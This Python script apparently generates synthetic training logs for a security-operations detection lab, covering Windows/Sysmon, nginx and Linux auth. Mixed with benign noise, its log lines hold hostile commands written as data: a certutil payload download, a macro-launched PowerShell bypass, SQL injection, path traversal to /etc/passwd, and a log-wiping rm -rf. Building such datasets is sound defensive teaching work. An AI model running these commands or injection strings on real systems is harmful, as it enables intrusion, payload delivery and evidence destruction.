#!/usr/bin/env python3
"""Генератор синтетических учебных датасетов Mini SOC Lab.

Создаёт детерминированные (seed 42) события с зарезервированными
адресами документации и демонстрационными маркерами. Повторный запуск
перезаписывает файлы 1:1 — датасеты воспроизводимы.
"""
from __future__ import annotations

import json
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
LOGS = ROOT / "logs"

# --- Windows: Security + Sysmon -----------------------------------------------

WIN = []


def win(ts: str, source: str, event_id: int | str, **kw: object) -> None:
    event = {"timestamp": ts, "host": kw.pop("host", "LAB-WIN01"),
             "source": source, "event_id": event_id,
             "message": kw.pop("message", ""),
             "src_ip": kw.pop("src_ip", None)}
    event.update(kw)
    WIN.append(event)


# Легитимный фоновый шум (не должен попадать в находки)
win("2026-10-20T08:59:00Z", "Security", 4624, user="service_backup", src_ip="192.0.2.10", logon_type=3,
    message="Successful network logon (scheduled backup)")
win("2026-10-20T09:01:40Z", "Security", 4688, user="LAB-WIN01\\student",
    image="C:\\Windows\\System32\\cmd.exe",
    parent_image="C:\\Windows\\explorer.exe",
    command_line="cmd.exe /c gpupdate /force",
    process_id=9001, parent_process_id=2124,
    message="Process creation (legitimate administrative task)")
win("2026-10-20T09:02:15Z", "Microsoft-Windows-Sysmon/Operational", 3, user="NT AUTHORITY\\SYSTEM",
    image="C:\\Windows\\System32\\svchost.exe",
    destination_ip="192.0.2.55", destination_port=443, protocol="tcp",
    message="Network connection (Windows Update)")

# Эпизод 1: brute force -> успешный вход
for sec, user in ((11, "administrator"), (19, "administrator"), (26, "sa"), (33, "administrator")):
    win(f"2026-10-21T09:02:{sec:02d}Z", "Security", 4625, user=user, src_ip="198.51.100.23",
        logon_type=3, message="An account failed to log on")
win("2026-10-21T09:03:02Z", "Security", 4624, user="administrator", src_ip="198.51.100.23",
    logon_type=3, message="Successful network logon")

# Эпизод 2: PowerShell EncodedCommand
win("2026-10-21T09:04:18Z", "Microsoft-Windows-Sysmon/Operational", 1, user="LAB-WIN01\\administrator",
    image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    parent_image="C:\\Windows\\explorer.exe",
    command_line="powershell.exe -NoProfile -EncodedCommand <REDACTED_DEMO_VALUE>",
    process_id=4120, parent_process_id=2180,
    message="Process creation")

# Эпизод 3: LOLBin — certutil скачивает payload
win("2026-10-21T09:06:45Z", "Microsoft-Windows-Sysmon/Operational", 1, user="LAB-WIN01\\administrator",
    image="C:\\Windows\\System32\\certutil.exe",
    parent_image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    command_line="certutil.exe -urlcache -split -f hxxp://198.51.100.23/update.exe C:\\Users\\Public\\update.exe",
    process_id=5102, parent_process_id=4120,
    message="Process creation")

# Эпизод 4: запуск из Temporary-папки повышенными правами
win("2026-10-21T09:07:20Z", "Microsoft-Windows-Sysmon/Operational", 1, user="LAB-WIN01\\administrator",
    image="C:\\Users\\Public\\update.exe",
    parent_image="C:\\Windows\\System32\\certutil.exe",
    command_line="C:\\Users\\Public\\update.exe --install",
    process_id=5690, parent_process_id=5102,
    message="Process creation")

# Эпизод 5: Office-процесс запустил cmd (макродроппер)
win("2026-10-21T10:15:03Z", "Microsoft-Windows-Sysmon/Operational", 1, user="LAB-WIN01\\student",
    image="C:\\Windows\\System32\\cmd.exe",
    parent_image="C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
    command_line="cmd.exe /c powershell -ep bypass -File C:\\Users\\student\\AppData\\Roaming\\update.ps1",
    process_id=6210, parent_process_id=2200,
    message="Process creation")

# Эпизод 6: C2 — powershell инициирует соединение на нехарактерный IP
win("2026-10-21T10:16:30Z", "Microsoft-Windows-Sysmon/Operational", 3, user="LAB-WIN01\\student",
    image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    destination_ip="203.0.113.77", destination_port=443, protocol="tcp",
    message="Network connection")

# Эпизод 7: Discovery
win("2026-10-21T10:17:44Z", "Security", 4688, user="LAB-WIN01\\administrator",
    image="C:\\Windows\\System32\\whoami.exe",
    parent_image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    command_line="whoami.exe /all",
    message="Process creation")
win("2026-10-21T10:18:02Z", "Security", 4688, user="LAB-WIN01\\administrator",
    image="C:\\Windows\\System32\\net.exe",
    parent_image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    command_line="net.exe user /domain",
    message="Process creation")

win("2026-10-21T10:20:00Z", "Security", 4634, user="LAB-WIN01\\administrator",
    message="An account was logged off")


# --- Web: nginx access log (combined format) -----------------------------------

def web_line(ts: str, ip: str, method: str, path: str, status: int, size: int, agent: str) -> str:
    return (f"{ip} - - [{ts}] \"{method} {path} HTTP/1.1\" {status} {size} "
            f"\"-\" \"{agent}\"")


def iso_to_nginx(iso: str) -> str:
    date, time = iso.split("T")
    time = time.split("+")[0].replace("Z", "")
    y, m, d = date.split("-")
    months = {1: "Jan", 2: "Feb", 3: "Mar", 4: "Apr", 5: "May", 6: "Jun",
              7: "Jul", 8: "Aug", 9: "Sep", 10: "Oct", 11: "Nov", 12: "Dec"}
    return f"{int(d):02d}/{months[int(m)]}/{y}:{time} +0000"


WEB: list[str] = []

# Легитимный трафик
for sec, path, size in ((30, "/", 1532), (31, "/login", 920), (45, "/static/app.js", 21400),
                        (50, "/api/orders", 11800)):
    WEB.append(web_line(iso_to_nginx(f"2026-10-22T10:01:{sec:02d}+00:00"), "192.0.2.8", "GET" if path != "/login" else "POST",
                        path, 200, size, "Mozilla/5.0 (X11; Linux x86_64) Chrome/120.0"))

# Сканирование директорий (много 404) с одного IP
SCAN_PATHS = ["/admin", "/backup.zip", "/.git/config", "/.env", "/wp-admin", "/phpmyadmin",
              "/config.php.bak", "/server-status", "/.ssh/id_rsa", "/api/keys", "/db.sql",
              "/dump.sql", "/panel", "/cpanel", "/test.php", "/info.php", "/admin.php",
              "/login.php.bak", "/old/", "/.htaccess", "/web.config", "/.svn/entries"]
for idx, path in enumerate(SCAN_PATHS):
    WEB.append(web_line(iso_to_nginx(f"2026-10-22T11:0{idx // 10}:{(idx * 3) % 60:02d}+00:00"),
                        "203.0.113.9", "GET", path, 404, 153, "Mozilla/5.0 (compatible; Nmap Scripting Engine)"))

# SQLi и path traversal с другого IP
WEB.append(web_line(iso_to_nginx("2026-10-22T11:31:04+00:00"), "203.0.113.44", "GET",
                    "/products.php?id=1%20OR%201%3D1", 500, 640, "sqlmap/1.8"))
WEB.append(web_line(iso_to_nginx("2026-10-22T11:32:11+00:00"), "203.0.113.44", "GET",
                    "/products.php?id=1%20UNION%20SELECT%20null,null", 500, 640, "sqlmap/1.8"))
WEB.append(web_line(iso_to_nginx("2026-10-22T11:33:20+00:00"), "203.0.113.44", "GET",
                    "/download.php?file=../../etc/passwd", 200, 1420, "curl/8.0"))

# Brut force на auth-эндпоинт (20 неуспешных POST)
for idx in range(20):
    WEB.append(web_line(iso_to_nginx(f"2026-10-22T12:{idx // 6:02d}:{(idx * 7) % 60:02d}+00:00"),
                        "198.51.100.87", "POST", "/login", 401, 96, "Mozilla/5.0 (Windows NT 10.0)"))

# Успешный вход после серии провалов
WEB.append(web_line(iso_to_nginx("2026-10-22T12:09:00+00:00"), "198.51.100.87", "POST",
                    "/login", 200, 862, "Mozilla/5.0 (Windows NT 10.0)"))


# --- Linux: syslog auth.log ------------------------------------------------------

def auth(ts: tuple[str, str, str], host: str, process: str, pid: int, message: str) -> str:
    month, day, clock = ts
    return f"{month} {int(day):2d} {clock} {host} {process}[{pid}]: {message}"


AUTH: list[str] = [
    # Легитимный шум
    auth(("Oct", 23, "08:59:02"), "LAB-UBU01", "sshd", 2210,
         "Accepted publickey for deploy from 192.0.2.10 port 49152 ssh2: RSA SHA256:demo"),
    auth(("Oct", 23, "09:00:31"), "LAB-UBU01", "sudo", 2221,
         "deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/systemctl status nginx"),
    auth(("Oct", 23, "09:10:11"), "LAB-UBU01", "sshd", 2214,
         "Connection closed by 192.0.2.30 port 49010 [preauth]"),
    # Эпизод 1: sshd brute force
    * [
        auth(("Oct", 23, f"11:{12 + i // 6:02d}:{(i * 11 + 5) % 60:02d}"), "LAB-UBU01", "sshd", 3000 + i,
             f"Failed password for {'invalid user ' if u == 'root' and i % 2 == 0 else ''}"
             f"{u} from 203.0.113.201 port {1024 + i * 7} ssh2")
        for i, u in enumerate(("root", "admin", "root", "oracle", "postgres", "root",
                               "ubuntu", "test", "dev", "root", "adm", "user1"))
    ],
    # Эпизод 2: успешный вход с того же IP
    auth(("Oct", 23, "11:14:21"), "LAB-UBU01", "sshd", 3132,
         "Accepted password for ops from 203.0.113.201 port 41832 ssh2"),
    # Эпизод 3: sudo wrong password retries
    auth(("Oct", 23, "11:20:05"), "LAB-UBU01", "sudo", 3140,
         "ops : 3 incorrect password attempts ; TTY=pts/2 ; PWD=/home/ops ; USER=root ; COMMAND=/bin/su"),
    auth(("Oct", 23, "11:22:15"), "LAB-UBU01", "sudo", 3145,
         "ops : user NOT in sudoers ; TTY=pts/2 ; PWD=/home/ops ; USER=root ; COMMAND=/bin/rm -rf /var/log"),
]


def write_jsonl(path: Path, events: list[dict[str, object]]) -> None:
    path.write_text(
        "".join(json.dumps(e, ensure_ascii=False) + "\n" for e in events), encoding="utf-8"
    )


def main() -> int:
    LOGS.mkdir(exist_ok=True)
    write_jsonl(LOGS / "windows_events.jsonl", WIN)
    (LOGS / "web_access.log").write_text("\n".join(WEB) + "\n", encoding="utf-8")
    (LOGS / "auth.log").write_text("\n".join(AUTH) + "\n", encoding="utf-8")
    for path in (LOGS / "windows_events.jsonl", LOGS / "web_access.log", LOGS / "auth.log"):
        print(f"written: {path} ({path.stat().st_size} bytes)")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
